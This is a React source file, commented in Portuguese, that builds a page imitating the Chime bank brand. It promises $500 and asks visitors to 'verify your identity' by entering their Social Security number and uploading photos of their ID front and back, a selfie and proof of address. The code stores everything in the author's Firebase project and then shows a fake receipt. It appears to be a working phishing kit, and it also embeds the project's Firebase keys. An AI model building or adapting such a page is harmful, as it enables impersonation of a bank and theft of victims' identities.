import React, { useState, useRef, useEffect } from 'react';
import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User, Loader2, FileText, ExternalLink } from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { getStorage, ref, uploadBytes, getDownloadURL } from 'firebase/storage';

// --- SUA CONFIGURAÇÃO (Já preenchi com base na sua foto) ---
const firebaseConfig = {
  apiKey: "AIzaSyAuITAkLq7XNhJd1AuOrXTXeqqjS8nG2ss",
  authDomain: "chime-case-teste.firebaseapp.com",
  projectId: "chime-case-teste",
  storageBucket: "chime-case-teste.firebasestorage.app",
  messagingSenderId: "176821948544",
  appId: "1:176821948544:web:b33e5edc17626963b4d665",
  measurementId: "G-8B4QLXJWJB"
};

// Inicialização segura
let app, auth, db, storage;
try {
  if (firebaseConfig.apiKey) {
    app = initializeApp(firebaseConfig);
    auth = getAuth(app);
    db = getFirestore(app);
    storage = getStorage(app);
  }
} catch (e) {
  console.error("Erro Firebase", e);
}

const BRAND = { green: '#00C865', darkGreen: '#004F2D', lightBg: '#F2F8F5' };

// Componente de Upload
const FileUploadField = ({ label, id, file, onFileChange, icon }) => {
  const inputRef = useRef(null);
  const handleClick = () => inputRef.current.click();
  const handleChange = (e) => { if (e.target.files && e.target.files[0]) onFileChange(id, e.target.files[0]); };

  return (
    <div className="mb-4">
      <label className="block text-sm font-bold text-gray-700 mb-2">{label}</label>
      <div onClick={handleClick} className={`relative border-2 border-dashed rounded-xl p-6 cursor-pointer transition-all ${file ? 'border-green-500 bg-green-50' : 'border-gray-300 hover:border-green-400'}`}>
        <input type="file" ref={inputRef} className="hidden" accept="image/*" onChange={handleChange} />
        <div className="flex flex-col items-center justify-center text-center">
          {file ? (
            <>
              <div className="bg-green-100 p-3 rounded-full mb-2"><Check className="w-6 h-6 text-green-600" /></div>
              <p className="text-sm font-semibold text-green-800 truncate max-w-[200px]">{file.name}</p>
            </>
          ) : (
            <>
              <div className="bg-gray-100 p-3 rounded-full mb-2">{icon || <Camera className="w-6 h-6 text-gray-500" />}</div>
              <p className="text-sm font-medium text-gray-600"><span className="text-green-600 font-bold">Upload</span> or take photo</p>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default function App() {
  const [step, setStep] = useState(1);
  const [submittedData, setSubmittedData] = useState(null);
  const [formData, setFormData] = useState({ ssn: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [user, setUser] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [uploadStatus, setUploadStatus] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  // Autenticação Anônima
  useEffect(() => {
    if (!auth) return;
    const unsubscribe = onAuthStateChanged(auth, (u) => {
      if (u) {
        console.log("Usuário conectado:", u.uid);
        setUser(u);
      } else {
        signInAnonymously(auth).catch((e) => {
            console.error(e);
            setErrorMsg("Connection error: Verifique se 'Autenticação Anônima' está ativada no Firebase.");
        });
      }
    });
    return () => unsubscribe();
  }, []);

  const handleFileChange = (fieldId, file) => setFormData(prev => ({ ...prev, [fieldId]: file }));
  
  const handleSSNChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 9) value = value.slice(0, 9);
    if (value.length > 5) value = `${value.slice(0, 3)}-${value.slice(3, 5)}-${value.slice(5)}`;
    else if (value.length > 3) value = `${value.slice(0, 3)}-${value.slice(3)}`;
    setFormData(prev => ({ ...prev, ssn: value }));
  };

  const uploadFile = async (file, path) => {
    if (!file) return null;
    const storageRef = ref(storage, path);
    const snapshot = await uploadBytes(storageRef, file);
    const url = await getDownloadURL(snapshot.ref);
    return { name: file.name, url: url };
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!user) {
        setErrorMsg("Aguardando conexão com o servidor... Tente novamente em 5 segundos.");
        return;
    }
    setIsSubmitting(true);
    setUploadStatus('Secure upload initialized...');
    
    try {
      const timestamp = Date.now();
      const basePath = `submissions/${user.uid}/${timestamp}`;
      
      setUploadStatus('Uploading ID Front...');
      const idFrontData = await uploadFile(formData.idFront, `${basePath}_front_${formData.idFront.name}`);
      
      setUploadStatus('Uploading ID Back...');
      const idBackData = await uploadFile(formData.idBack, `${basePath}_back_${formData.idBack.name}`);
      
      setUploadStatus('Uploading Selfie...');
      const selfieData = await uploadFile(formData.selfie, `${basePath}_selfie_${formData.selfie.name}`);
      
      setUploadStatus('Uploading Proof of Address...');
      const proofData = await uploadFile(formData.proofAddress, `${basePath}_proof_${formData.proofAddress.name}`);
      
      setUploadStatus('Finalizing...');
      // Convertendo timestamp para string para exibição imediata
      const payload = { 
        userId: user.uid, 
        ssn_masked: `***-**-${formData.ssn.slice(-4)}`, 
        status: 'pending_review', 
        submittedAt: new Date().toISOString(), 
        documents: { idFront: idFrontData, idBack: idBackData, selfie: selfieData, proofAddress: proofData } 
      };
      
      await addDoc(collection(db, 'applications'), {
          ...payload,
          submittedAt: serverTimestamp() // Salva timestamp real no banco
      });
      
      setSubmittedData(payload);
      setStep(2);
    } catch (err) {
      console.error(err);
      setErrorMsg("Upload falhou. Verifique se o 'Storage' está habilitado no modo Teste no Firebase Console.");
    } finally {
      setIsSubmitting(false);
      setUploadStatus('');
    }
  };

  const isFormValid = formData.ssn.length === 11 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;

  if (step === 2) return (
    <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans">
      <div className="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full border border-green-100">
        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"><Check className="w-10 h-10 text-[#00C865]" strokeWidth={3} /></div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Application Received!</h2>
        <p className="text-gray-600 mb-6 text-sm">We have received your documents. See receipt below.</p>
        
        {submittedData && (
          <div className="bg-gray-50 rounded-lg p-4 mb-6 text-left border border-gray-200">
            <h4 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Submission Receipt</h4>
            <div className="space-y-3">
              <div className="flex justify-between text-sm"><span className="text-gray-600">SSN:</span><span className="font-mono text-gray-800">{submittedData.ssn_masked}</span></div>
              <div className="border-t border-gray-200 my-2 pt-2">
                <p className="text-xs text-gray-400 mb-2">Uploaded Files (Click to verify):</p>
                {Object.entries(submittedData.documents).map(([key, file]) => (
                  <a key={key} href={file.url} target="_blank" rel="noopener noreferrer" className="flex items-center justify-between p-2 hover:bg-white rounded border border-transparent hover:border-gray-200 cursor-pointer group">
                    <div className="flex items-center"><FileText className="w-4 h-4 text-gray-400 mr-2" /><span className="text-xs text-gray-600 capitalize">{key}</span></div>
                    <ExternalLink className="w-3 h-3 text-gray-400 group-hover:text-green-600" />
                  </a>
                ))}
              </div>
            </div>
          </div>
        )}
        <button className="w-full bg-[#00C865] text-white font-bold py-4 rounded-xl shadow-lg" onClick={() => window.location.reload()}>New Application</button>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-50 font-sans">
      <nav className="bg-white py-4 px-6 flex justify-between items-center shadow-sm relative z-20">
        <div className="text-2xl font-black tracking-tighter" style={{ color: BRAND.green }}>chime</div>
        <div className="hidden md:flex space-x-6 text-sm font-semibold text-gray-600 items-center"><button className="bg-[#00C865] text-white px-5 py-2 rounded-lg font-bold">Sign Up</button></div>
        <button className="md:hidden" onClick={() => setIsMenuOpen(!isMenuOpen)}>{isMenuOpen ? <X /> : <Menu />}</button>
      </nav>
      <div className="bg-[#004F2D] text-white pt-12 pb-24 px-6 text-center relative"><h1 className="text-3xl md:text-5xl font-bold mb-4">Join Chime today and get <span className="text-[#00C865]">$500</span>.</h1></div>
      <div className="px-4 -mt-16 pb-20 relative z-10">
        <div className="max-w-lg mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
          <div className="bg-gray-50 p-6 border-b border-gray-100"><h2 className="text-xl font-bold text-gray-800">Verify your identity</h2></div>
          <form onSubmit={handleSubmit} className="p-6 space-y-6">
            <div className="space-y-3"><label className="flex justify-between text-sm font-bold text-gray-700"><span>Social Security Number (SSN)</span><Lock className="w-3 h-3 text-gray-400" /></label><div className="relative group"><input type="text" value={formData.ssn} onChange={handleSSNChange} placeholder="XXX-XX-XXXX" className="w-full px-4 py-4 border-2 border-gray-200 rounded-xl focus:border-[#00C865] outline-none text-lg tracking-widest font-mono" /><Shield className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" /></div></div>
            <hr className="border-gray-100" />
            <div><h3 className="text-md font-bold text-gray-800 mb-4">Document Upload</h3>
              <FileUploadField label="Government ID (Front)" id="idFront" file={formData.idFront} onFileChange={handleFileChange} />
              <FileUploadField label="Government ID (Back)" id="idBack" file={formData.idBack} onFileChange={handleFileChange} />
              <div className="my-6 p-4 bg-green-50 rounded-xl border border-green-100"><FileUploadField label="Selfie Verification" id="selfie" file={formData.selfie} onFileChange={handleFileChange} icon={<User className="w-6 h-6 text-gray-500" />} /></div>
              <FileUploadField label="Proof of Residence" id="proofAddress" file={formData.proofAddress} onFileChange={handleFileChange} />
            </div>
            {errorMsg && <div className="bg-red-50 text-red-600 text-sm p-3 rounded-lg flex items-center justify-center"><AlertCircle className="w-4 h-4 mr-2" /> {errorMsg}</div>}
            <button type="submit" disabled={!isFormValid || isSubmitting} className={`w-full py-4 rounded-xl text-lg font-bold shadow-lg flex items-center justify-center space-x-2 transition-all ${isFormValid && !isSubmitting ? 'bg-[#00C865] text-white hover:-translate-y-1' : 'bg-gray-100 text-gray-400'}`}>{isSubmitting ? <><Loader2 className="animate-spin w-6 h-6 mr-2"/> {uploadStatus}</> : <><span>Complete Application</span><ChevronRight className="w-5 h-5" /></>}</button>
          </form>
        </div>
      </div>
    </div>
  );
}